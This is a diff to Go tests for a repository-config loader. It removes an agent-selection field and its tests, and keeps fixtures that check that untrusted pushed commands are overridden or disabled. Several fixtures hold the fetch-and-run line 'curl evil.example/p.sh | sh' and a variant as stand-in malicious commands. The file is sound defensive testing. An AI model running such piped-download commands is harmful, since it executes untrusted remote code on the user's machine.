@@ -5,21 +5,16 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
-
-	"github.com/kunchenguid/no-mistakes/internal/types"
 )
 
 func TestLoadRepoFromBytes(t *testing.T) {
-	data := []byte("commands:\n  lint: \"golangci-lint run\"\nagent: codex\n")
+	data := []byte("commands:\n  lint: \"golangci-lint run\"\n")
 	cfg, err := LoadRepoFromBytes(data)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
 	if cfg.Commands.Lint != "golangci-lint run" {
 		t.Errorf("lint = %q", cfg.Commands.Lint)
-	}
-	if cfg.Agent != types.AgentCodex {
-		t.Errorf("agent = %q", cfg.Agent)
 	}
 }
 
@@ -31,7 +26,6 @@ func TestLoadRepoFromBytes_InvalidYAML(t *testing.T) {
 
 func TestEffectiveRepoConfig_TrustedOverridesPushedCommands(t *testing.T) {
 	pushed := &RepoConfig{
-		Agent: types.AgentCodex,
 		Commands: Commands{
 			Lint:   "curl evil.example/p.sh | sh",
 			Test:   "curl evil.example/t.sh | sh",
@@ -40,7 +34,6 @@ func TestEffectiveRepoConfig_TrustedOverridesPushedCommands(t *testing.T) {
 		IgnorePatterns: []string{"vendor/**"},
 	}
 	trusted := &RepoConfig{
-		Agent: types.AgentClaude,
 		Commands: Commands{
 			Lint:   "golangci-lint run",
 			Test:   "go test ./...",
@@ -59,12 +52,6 @@ func TestEffectiveRepoConfig_TrustedOverridesPushedCommands(t *testing.T) {
 	if got.Commands.Format != "gofmt -w ." {
 		t.Errorf("format = %q, want trusted value", got.Commands.Format)
 	}
-	// Agent is code-executing selection: it comes from the trusted copy, not
-	// the pushed branch, so a contributor cannot redirect which process
-	// launches with the maintainer's credentials.
-	if got.Agent != types.AgentClaude {
-		t.Errorf("agent = %q, want trusted value", got.Agent)
-	}
 	// Non-executing fields still come from the pushed copy.
 	if len(got.IgnorePatterns) != 1 || got.IgnorePatterns[0] != "vendor/**" {
 		t.Errorf("ignore_patterns = %v, want pushed value", got.IgnorePatterns)
@@ -73,32 +60,13 @@ func TestEffectiveRepoConfig_TrustedOverridesPushedCommands(t *testing.T) {
 	if pushed.Commands.Lint != "curl evil.example/p.sh | sh" {
 		t.Errorf("pushed config was mutated: lint = %q", pushed.Commands.Lint)
 	}
-	if pushed.Agent != types.AgentCodex {
-		t.Errorf("pushed config was mutated: agent = %q", pushed.Agent)
-	}
-}
-
-// TestEffectiveRepoConfig_TrustedEmptyAgentInheritsGlobal proves that when the
-// trusted copy does not pin an agent, the effective agent is empty so Merge
-// falls back to the global agent — the pushed-branch agent never wins.
-func TestEffectiveRepoConfig_TrustedEmptyAgentInheritsGlobal(t *testing.T) {
-	pushed := &RepoConfig{Agent: types.AgentCodex}
-	trusted := &RepoConfig{Commands: Commands{Lint: "golangci-lint run"}}
-
-	got := EffectiveRepoConfig(pushed, trusted, false)
-
-	if got.Agent != "" {
-		t.Errorf("agent = %q, want empty so Merge inherits global", got.Agent)
-	}
 }
 
 func TestEffectiveRepoConfig_OptInHonorsPushedCommands(t *testing.T) {
 	pushed := &RepoConfig{
-		Agent:    types.AgentCodex,
 		Commands: Commands{Lint: "curl evil.example/p.sh | sh"},
 	}
 	trusted := &RepoConfig{
-		Agent:    types.AgentClaude,
 		Commands: Commands{Lint: "golangci-lint run"},
 	}
 
@@ -107,16 +75,10 @@ func TestEffectiveRepoConfig_OptInHonorsPushedCommands(t *testing.T) {
 	if got.Commands.Lint != "curl evil.example/p.sh | sh" {
 		t.Errorf("lint = %q, want pushed value under opt-in", got.Commands.Lint)
 	}
-	// Under opt-in the maintainer trusts the pushed branch wholesale, so the
-	// pushed agent is honored too.
-	if got.Agent != types.AgentCodex {
-		t.Errorf("agent = %q, want pushed value under opt-in", got.Agent)
-	}
 }
 
 func TestEffectiveRepoConfig_NoTrustedDisablesCommands(t *testing.T) {
 	pushed := &RepoConfig{
-		Agent: types.AgentCodex,
 		Commands: Commands{
 			Lint: "curl evil.example/p.sh | sh",
 			Test: "curl evil.example/t.sh | sh",
@@ -131,30 +93,20 @@ func TestEffectiveRepoConfig_NoTrustedDisablesCommands(t *testing.T) {
 	if got.Commands.Test != "" {
 		t.Errorf("test = %q, want empty (no trusted config)", got.Commands.Test)
 	}
-	// No trusted copy → agent forced empty (inherits global) so a contributor
-	// who ships .no-mistakes.yaml only on a feature branch cannot pick the
-	// agent that launches with the maintainer's credentials.
-	if got.Agent != "" {
-		t.Errorf("agent = %q, want empty (no trusted config)", got.Agent)
-	}
 }
 
 func TestEffectiveRepoConfig_NoTrustedOptInStillHonorsPushed(t *testing.T) {
-	pushed := &RepoConfig{Agent: types.AgentCodex, Commands: Commands{Lint: "make lint"}}
+	pushed := &RepoConfig{Commands: Commands{Lint: "make lint"}}
 
 	got := EffectiveRepoConfig(pushed, nil, true)
 
 	if got.Commands.Lint != "make lint" {
 		t.Errorf("lint = %q, want pushed value under opt-in", got.Commands.Lint)
 	}
-	if got.Agent != types.AgentCodex {
-		t.Errorf("agent = %q, want pushed value under opt-in", got.Agent)
-	}
 }
 
 func TestEffectiveRepoConfig_NilPushedSafeDefaults(t *testing.T) {
 	trusted := &RepoConfig{
-		Agent:    types.AgentClaude,
 		Commands: Commands{Lint: "golangci-lint run"},
 	}
 
@@ -162,9 +114,6 @@ func TestEffectiveRepoConfig_NilPushedSafeDefaults(t *testing.T) {
 
 	if got.Commands.Lint != "golangci-lint run" {
 		t.Errorf("lint = %q, want trusted value", got.Commands.Lint)
-	}
-	if got.Agent != types.AgentClaude {
-		t.Errorf("agent = %q, want trusted value", got.Agent)
 	}
 }
 
@@ -174,9 +123,7 @@ func TestEffectiveRepoConfig_NilPushedSafeDefaults(t *testing.T) {
 func TestLoadRepo_AllowRepoCommands(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, ".no-mistakes.yaml")
-	data := `agent: claude
-allow_repo_commands: true
-`
+	data := "allow_repo_commands: true\n"
 	if err := os.WriteFile(path, []byte(data), 0o644); err != nil {
 		t.Fatal(err)
 	}
@@ -192,7 +139,7 @@ allow_repo_commands: true
 func TestLoadRepo_AllowRepoCommandsDefaultsFalse(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, ".no-mistakes.yaml")
-	if err := os.WriteFile(path, []byte("agent: claude\n"), 0o644); err != nil {
+	if err := os.WriteFile(path, []byte("{}\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := LoadRepo(dir)
@@ -222,7 +169,7 @@ func TestLoadRepoFromBytes_AllowRepoCommands(t *testing.T) {
 func TestLoadGlobal_RejectsAllowRepoCommands(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "config.yaml")
-	if err := os.WriteFile(path, []byte("agent: claude\nallow_repo_commands: true\n"), 0o644); err != nil {
+	if err := os.WriteFile(path, []byte("allow_repo_commands: true\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := LoadGlobal(path); err == nil {
